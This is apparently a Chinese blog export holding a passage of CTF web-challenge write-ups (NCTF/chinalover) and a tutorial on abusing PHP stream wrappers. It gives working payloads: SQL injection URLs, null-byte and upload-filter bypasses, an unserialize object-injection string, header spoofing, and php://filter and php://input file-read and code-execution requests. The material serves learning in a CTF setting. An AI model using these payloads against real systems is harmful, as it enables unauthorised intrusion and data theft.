(ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) # (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#39;_&#39;); 脑洞加密方式 http://www.tuicool.com/articles/2E3INnmfirebug 粘贴后 运行 nctf{javascript_aaencode} 7、看起来像是老题 burpsuit抓包 8、refer头部修改ncf{http_referer} 9、nctf{gzip_base64_hhhhhh} 10、filter方式读取源码http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php得到base64编码 并解码得到 11、burpsuit抓包， sendtorepeater 可以发现有重定向 一个个慢慢翻 nctf{this_is_302_redirect} 12、提示下载其他东西，查看源代码，发现下载连接为 download.php?url=[base64]已知的文件有 download.php 尝试下载 download.php -》 ZG93bmxvYWQucGhw 并查看所以继续下载 hereiskey.php -&gt; nctf{download_any_file_666} 13、页面提示 cookie burp抓包设置cookie为0 后发现右边出现 Login=0将cookie设置为 Login=1 nctf{cookie_is_different_from_session} 14、 访问http://chinalover.sinaapp.com/web11/robots.txt别太开心，flag不在这，这个文件的用途你看完了？在CTF比赛中，这个文件往往存放着提示信息TIP:sql.php &lt;?php if($_GET[id]) { mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&#39;$id&#39;&quot;)); if ($_GET[id]==1024) { echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;; } else{ echo($query[content]); } } ?&gt; 所以目标是 http://chinalover.sinaapp.com/web11/sql.php 参数是 id 而且其中的那个数字 1024 很奇怪啊 intval是取整函数，所以让 id等于 1024.* 比如1024.9999999 1024.0000001 则$id = intval($_GET[id]) 后 $id=1024 http://chinalover.sinaapp.com/web11/sql.php?id=1024.1 nctf{query_in_mysql} 15、gbk 提示：宽字节注入先查 表名 http://115.28.150.176/sqli/index.php?id=1%df&#39; union select 1,table_name from information_schema.tables%23 再查 字段名 http://115.28.150.176/sqli/index.php?id=1%df&#39; union select 1,column_name from information_schema.columns where table_name=0x666c6167%23 查询 数据 http://115.28.150.176/sqli/index.php?id=1%df&#39; union select 1,fl4g from flag %23 nctf{gbk_3sqli} 资料：宽字节注入https://www.91ri.org/8611.html 16、考点是 截断 然而…… * teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[0]=a &lt;-为什么这个方法可以？…… 运气 * teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=1%00%23biubiubiu %00截断 %23为 # flag:nctf{use_00_to_jieduan} 17、注意和第二题的区别，第二题是== 而这一题是 === 要求不仅仅是值相同 而且类型要相同，所以这一题不能用md5碰撞在php中 md5() 需要一个string参数，但若传入一个数组类型，它不会报错但会返回空值利用这点，我们传入两个数组进行绕过if判断http://chinalover.sinaapp.com/web17/index.php?a[]=1&amp;b[]=0 Flag: nctf{php_is_so_cool} 18、变量覆盖！ &lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) { ?&gt; &lt;?php extract($_POST); if ($pass == $thepassword_123) { ?&gt; &lt;div class=&quot;alert alert-success&quot;&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt; &lt;/div&gt; &lt;?php } ?&gt; &lt;?php } ?&gt; extract函数“可能”导致变量覆盖漏洞，我们传入pass的值，并且把thepassword_123的值覆盖为我们需要的值 nctf{bian_liang_fu_gai!} 19、查看index.txt &lt;?php if(eregi(“hackerDJ”,$_GET[id])) { echo(“not allowed!“); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == &quot;hackerDJ&quot;) { echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;flag: *****************} &lt;/p&gt;&quot;; } ?&gt; &lt;br&gt;&lt;br&gt; Can you authenticate to this website? id 不能与 hackerDJ 相等，而且id经过 urldecode后要与 hackerDJ相同 http://php.net/manual/en/function.urldecode.php $_GET[]本身就有urldecode的功能 而且就 urlencode，是把对应的ASCII码前面加上%，urldecode就是把对应的编码还原，而未经编码的保持不变 所以对hackerDJ中的任意一个进行编码或是全部编码，效果相同 http://way.nuptzj.cn/php/index.php?id=%2568ackerDJ %2568ackerDJ在第一个GET处被urldecode成 %68ackerDJ ,绕过了第一个if判断， 接着是 代码中的显式urldecode，被还原成 hackerDJ 从而拿到 flag 20、本地登录，上burp 添加X-Forwarded-For:127.0.0.1 nctf{happy_http_headers} 21、都已经提示header了burp抓包，查看 nctf{tips_often_hide_here} 22、查看一下源代码，看一看upload.php然后我把那张gif.gif的图片传了上去，结果这里只写一下正确姿势，其余的上传绕过日后总结，在upload这里添上 1.php .gif (php和 . 之间是 空格键产生的空格)这里的 20 就是php和 . 之间的空格利用 00 截断上传 ，把 20 修改为 00nctf{welcome_to_hacks_world} 23、点进去是 Source 代码，没有看到显式的过滤或转义， trim（）是去除两侧空格所以尝试传入user为 admin’)# 其中 ‘）用来分别用来闭合 #用来把后面给注释掉这样最后的查询语句为 select user from ctf where (user=&#39;admin&#39;) nctf{ni_ye_hui_sql?} 24、注意提示： tip:strcmp(array,string)=null=0 所以根据代码逻辑，我们传入的pass若与pass1相等，则返回0， ！strcmp则为 真 这里是关于strcmp的解释http://www.w3school.com.cn/php/func_string_strcmp.asp 利用提示，我们传入 pass数组，比如 pass[]=1, 见右上。 nctf{strcmp_is_n0t_3afe} 25、传入十六进制，可以绕过判断， 54975581388http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc nctf{follow_your_dream} 26、既然是admin的密码，怎么会是ctfuser呢…… 上burpsuit 改一改，然而不对。 注意到地址栏，user1传了一个参数：ctfuser的加密结果 进去，这个也必须改掉 所以改为 user1=YWRtaW4= 后面那串是admin的base64加密。 GO nctf{reset_password_often_have_vuln} 27、在xman训练营时有接触过某题，我们以为它的考点是反序列化，但当时没有类（class），最后只好作罢：） &lt;?php class just4fun { var $enter; var $secret; } if (isset($_GET[&#39;pass&#39;])) { $pass = $_GET[&#39;pass&#39;]; if(get_magic_quotes_gpc()){ $pass=stripslashes($pass); } $o = unserialize($pass); if ($o) { $o-&gt;secret = &quot;*&quot;; if ($o-&gt;secret === $o-&gt;enter) echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret; else echo &quot;Oh no... You can&#39;t fool me&quot;; } else echo &quot;are you trolling?&quot;; } ?&gt; https://www.91ri.org/3960.htmlhttp://www.freebuf.com/vuls/80293.html然而有道坎实在绕不过去，那个$o-&gt;secret = “*”; 我不知道如何构造成相等……参考网上的一篇……http://115.159.210.46/archives/19.html &lt;?php class just4fun{ var $enter; var $secret; } $class =new just4fun(); $class-&gt;enter=&amp;$class-&gt;secret; print_r(serialize($class)) ?&gt;由上述代码得到最后的payload： http://115.28.150.176/php1/index.php?pass=O:8:%22just4fun%22:2:{s:5:%22enter%22;N;s:6:%22secret%22;R:2;}最后稍微总结一下知识点：1）反序列化漏洞，2）php在面对object传值时的“特性” nctf{serialize_and_unserialize} 28、好熟悉的感觉，看看源代码…… &lt;!-- #GOAL: login as admin,then get the flag; error_reporting(0); require &#39;db.inc.php&#39;; function clean($str){ if(get_magic_quotes_gpc()){ $str=stripslashes($str); } return htmlentities($str, ENT_QUOTES); } $username = @clean((string)$_GET[&#39;username&#39;]); $password = @clean((string)$_GET[&#39;password&#39;]); $query=&#39;SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;&#39;; $result=mysql_query($query); if(!$result || mysql_num_rows($result) &lt; 1){ die(&#39;Invalid password!&#39;); } echo $flag; --&gt;Invalid password! 好吧 xman夏令营时原题做过了SELECT FROM users WHERE name=’admin\’ AND pass=’ or 1 #’;这样一来 name=’*‘ or 1 条件恒真所以payload是 username=admin\&amp;password=%20or%201%23 nctf{sql_injection_is_interesting} 29、jsfuck……放到firebug里直接运行一下，出来一个新页面，其内容如下图http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php访问http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php 在header里啊,上burpsuit查看，发现tip为 history of bash. 如下左图百度了一下， 如上右图，所以试着访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history 得到新提示 zip -r flagbak.zip ./* 这是吧flagbak.zip文件解压到当前目录下， 所以flagbak.zip文件有可能仍然存在 尝试访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip解压，里面有flag.txt文件，打开，得到flag。 nctf{bash_history_means_what} 30、 &lt;?php if($_POST[user] &amp;&amp; $_POST[pass]) { mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&#39;$user&#39;&quot;)); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) { echo &quot;&lt;p&gt;Logged in! Key: ntcf{**************} &lt;/p&gt;&quot;; } else { echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); } } ntcf{union_select_is_wtf}]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[浅谈php伪协议及在CTF比赛中的应用]]></title>
      <url>%2F2007%2F06%2F22%2F%E6%B5%85%E8%B0%88php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%9C%A8CTF%E6%AF%94%E8%B5%9B%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%2F</url>
      <content type="text"><![CDATA[file://利用该协议可以访问本地文件系统，从而可能读取到敏感文件。 以wechall上的一题为例：1http://www.wechall.net/challenge/crappyshare/index.php?show=code 第215行开始，有如下代码：12345678910111213141516171819202122232425&lt;?php 省略function upload_please_by_url($url)&#123; if (1 === preg_match('#^[a-z]&#123;3,5&#125;://#', $url)) # Is URL? &#123; $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_FAILONERROR, true); if (false === ($file_data = curl_exec($ch))) &#123; htmlDisplayError('cURL failed.'); &#125; else &#123; // Thanks upload_please_thx($file_data); &#125; &#125; else &#123; htmlDisplayError('Your URL looks errorneous.'); &#125;&#125;省略?&gt; curl_exec($ch)中的$ch可控，原本是希望能curl到远程服务器上的资源，但这里可以利用file：//读取到本地敏感文件。1http://www.wechall.net/challenge/crappyshare/crappyshare.php php://http://cn2.php.net/manual/zh/wrappers.php.php 访问各个输入/输出流（I/O streams） php://filter读取文件这个经常在ctf比赛中用来读取源码，返回的是base64加密后的结果。假设index.php源码如下：1234&lt;?php @include($_GET["chybeta"]); show_source(__FILE__);?&gt; 利用php://filter读取index.php源码1http://XXX/index.php?file=php://filter/read=convert.base64-encode/resource=index.php php://input基本利用php://input 是个可以访问请求的原始数据的只读流，可以读取到来自POST的原始数据。但当 enctype=”multipart/form-data” 的时候 php://input 是无效的。 16年华山杯，源码如下：123456789101112&lt;?php$user = $_GET["user"];$file = $_GET["file"];$pass = $_GET["pass"];if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="the user is admin"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //class.php&#125;else&#123; echo "you are not admin ! ";&#125;?&gt; 可以利用php：//input。如下： 代码执行利用条件：allow_url_include = On。不过其实若allow_url_include = On 的话就可以直接远程文件包含了：）。测试代码同上。12url: http://localhost:20000/index.php?chybeta=php://inputpost: &lt;? phpinfo() ?&gt; 若没有开启allow_url_include，则会执行失败。 http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLs zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流]]></content>
    </entry>

    
  
  
</search>
